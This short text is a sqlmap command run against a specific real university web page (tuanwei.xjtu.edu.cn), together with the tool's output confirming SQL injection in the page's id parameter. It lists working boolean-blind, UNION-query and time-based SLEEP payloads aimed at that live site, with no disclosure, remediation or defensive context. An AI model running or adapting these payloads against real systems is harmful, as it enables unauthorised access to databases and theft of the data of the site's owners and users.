sqlmap -u http://tuanwei.xjtu.edu.cn/index.php/Zixun/contentshow/id/2206*.html---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://tuanwei.xjtu.edu.cn:80/index.php/Zixun/contentshow/id/2206 AND 3842=3842.html    Type: UNION query    Title: MySQL UNION query (NULL) - 3 columns    Payload: http://tuanwei.xjtu.edu.cn:80/index.php/Zixun/contentshow/id/-4432 UNION ALL SELECT CONCAT(0x71646e6d71,0x616e7352776461456b67,0x7171767371),NULL,NULL#.html    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://tuanwei.xjtu.edu.cn:80/index.php/Zixun/contentshow/id/2206 AND SLEEP(5).html---
